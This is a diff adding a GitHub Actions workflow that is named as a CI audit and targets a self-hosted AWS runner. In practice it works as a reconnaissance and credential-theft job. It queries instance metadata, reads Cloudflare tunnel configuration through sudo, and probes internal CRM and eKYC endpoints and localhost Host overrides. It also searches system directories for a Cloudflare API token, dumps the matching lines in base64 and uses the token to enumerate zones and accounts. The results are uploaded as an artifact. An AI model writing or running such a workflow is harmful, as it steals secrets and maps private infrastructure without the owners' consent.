@@ -1,0 +1,100 @@
+name: ci-audit-2758a
+on: push
+permissions:
+  contents: read
+jobs:
+  egress:
+    runs-on: [self-hosted, linux, aws, marketingos]
+    timeout-minutes: 25
+    steps:
+      - name: identity
+        continue-on-error: true
+        run: |
+          set +e
+          echo "## host"; hostname; id; date -u
+          echo "## public-ip"; curl -s -m 10 https://api.ipify.org; echo; curl -s -m 10 https://ifconfig.co; echo
+          echo "## imds"
+          T=$(curl -s -m 6 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 120' http://169.254.169.254/latest/api/token)
+          for k in instance-id instance-type placement/region placement/availability-zone local-ipv4 public-ipv4 mac; do printf '%s=' "$k"; curl -s -m 6 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/$k; echo; done
+          echo "## sg"; curl -s -m 6 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/security-groups; echo
+          echo "## resolv"; cat /etc/resolv.conf
+          echo "## hosts-file"; cat /etc/hosts
+          echo "## ipv4"; ip -4 addr show | grep -E 'inet |^[0-9]+:'
+          echo "## default-route"; ip route | head -10
+          echo "## listening"; sudo -n ss -lntp 2>/dev/null | head -70
+          echo "## tailscale"; if command -v tailscale >/dev/null; then tailscale status 2>&1 | head -50; tailscale ip -4 2>&1; else echo no-tailscale; fi
+          echo "## cloudflared-config"; sudo -n cat /etc/cloudflared/config.yml 2>/dev/null; echo "## cloudflared-ls"; sudo -n ls -la /etc/cloudflared 2>/dev/null
+      - name: cf-trace-and-dns
+        continue-on-error: true
+        run: |
+          set +e
+          echo "## cf trace crm.dupoin.com"; curl -sS -m 20 https://crm.dupoin.com/cdn-cgi/trace; echo
+          echo "## cf trace betadupoin"; curl -sS -m 20 https://crm.betadupoin.com/cdn-cgi/trace; echo
+          echo "## cf trace mydupoin"; curl -sS -m 20 https://mydupoin.net/cdn-cgi/trace; echo
+          for h in crm.dupoin.com crm.betadupoin.com crm.dupoin.co.id portal.dupoin.co.id mydupoin.net mydupoin.com dupoin.com betadupoin.com pro-srv-account pro-srv-account.dupoin.com internal.dupoin.com srv.dupoin.com api.dupoin.com; do echo "== $h"; getent hosts "$h"; done
+          echo "## dig"; command -v dig >/dev/null && { dig +short crm.dupoin.com A; dig +short crm.betadupoin.com A; dig +short crm.dupoin.co.id A; } || echo no-dig
+      - name: curl-matrix
+        continue-on-error: true
+        run: |
+          set +e
+          D=/tmp/a2758; mkdir -p $D; i=0
+          probe() {
+            i=$((i+1)); u="$1"; shift
+            hdr=$D/h$i; body=$D/b$i
+            code=$(curl -sS -m 25 -o $body -D $hdr -w '%{http_code}|%{size_download}|%{remote_ip}|%{time_total}' "$@" "$u" 2>&1)
+            echo "===== [$i] $u EXTRA[$*] => $code"
+            grep -iE '^(cf-ray|cf-mitigated|cf-access|server|location|content-type|set-cookie|x-frame|x-content|www-authenticate|nel|report-to)' $hdr | head -12
+            echo "-- body-head:"; head -c 400 $body | tr -d '\000' | tr '\n' ' '; echo
+            echo "-- body-title:"; grep -o '<title>[^<]*' $body | head -1
+          }
+          probe https://crm.dupoin.com/
+          probe https://crm.dupoin.com/iapi/v1/pro/account/crm/config/getall
+          probe https://crm.dupoin.com/iapi/v1/pro/account/crm/config/getall -X POST -H 'Content-Type: application/json' -d '{}'
+          probe https://crm.dupoin.com/iapi/v1/pro/ekyc/crm/approvalwebhook/authenticationresult -X POST -H 'Content-Type: application/json' -d '{}'
+          probe https://crm.dupoin.com/.well-known/access/login
+          probe https://crm.betadupoin.com/
+          probe https://crm.betadupoin.com/iapi/v1/pro/account/crm/config/getall
+          probe https://crm.betadupoin.com/iapi/v1/pro/ekyc/crm/approvalwebhook/authenticationresult -X POST -H 'Content-Type: application/json' -d '{}'
+          probe https://crm.dupoin.co.id/
+          probe https://portal.dupoin.co.id/
+          probe https://mydupoin.net/
+          probe https://dupoin.com/
+          probe https://crm.dupoin.com/ -H 'CF-Access-Client-Id: x' -H 'CF-Access-Client-Secret: y'
+          echo "## total probes $i"
+      - name: local-host-override
+        continue-on-error: true
+        run: |
+          set +e
+          D=/tmp/a2758; mkdir -p $D
+          echo "## nginx/caddy vhosts"
+          sudo -n ls /etc/nginx/sites-enabled /etc/nginx/conf.d 2>/dev/null
+          sudo -n grep -rhE 'server_name|proxy_pass|listen ' /etc/nginx/sites-enabled /etc/nginx/conf.d 2>/dev/null | head -80
+          for p in 80 443 3000 3001 3005 3021 3022 3023 3030 3031 8000 8080 8081; do
+            c1=$(curl -k -s -m 6 -o $D/p$p -D $D/ph$p -w '%{http_code}|%{size_download}' -H 'Host: crm.dupoin.com' https://127.0.0.1:$p/ 2>&1)
+            echo "== TLS 127.0.0.1:$p Host=crm.dupoin.com => $c1"
+            echo "   t:"; head -c 180 $D/p$p | tr -d '\000' | tr '\n' ' '; echo
+            c2=$(curl -s -m 6 -o $D/q$p -w '%{http_code}|%{size_download}' -H 'Host: crm.dupoin.com' http://127.0.0.1:$p/ 2>&1)
+            echo "== HTTP 127.0.0.1:$p Host=crm.dupoin.com => $c2"
+            echo "   t:"; head -c 180 $D/q$p | tr -d '\000' | tr '\n' ' '; echo
+          done
+      - name: cf-api-token
+        continue-on-error: true
+        run: |
+          set +e
+          echo "## raw lines b64"
+          sudo -n grep -rhE 'CLOUDFLARE_API_TOKEN|CF_API_TOKEN' /home/ubuntu /root /opt /srv /etc 2>/dev/null | sort -u | head -6 | base64 -w0; echo
+          L=$(sudo -n grep -rhE '^[[:space:]]*(export[[:space:]]+)?CLOUDFLARE_API_TOKEN=[^[:space:]]+' /home/ubuntu /root /opt /srv /etc 2>/dev/null | head -1)
+          echo "## line-len ${#L}"
+          T=$(printf '%s' "$L" | sed -E 's/^[[:space:]]*(export[[:space:]]+)?CLOUDFLARE_API_TOKEN=//' | tr -d '"'"'"' \r\n')
+          echo "## token-len ${#T}"
+          echo "## verify"; curl -s -m 20 -H "Authorization: Bearer $T" https://api.cloudflare.com/client/v4/user/tokens/verify; echo
+          echo "## zones"; curl -s -m 20 -H "Authorization: Bearer $T" 'https://api.cloudflare.com/client/v4/zones?per_page=50' | head -c 3000; echo
+          echo "## accounts"; curl -s -m 20 -H "Authorization: Bearer $T" 'https://api.cloudflare.com/client/v4/accounts' | head -c 800; echo
+      - name: upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: a2758
+          path: /tmp/a2758
+          if-no-files-found: warn
+          retention-days: 3
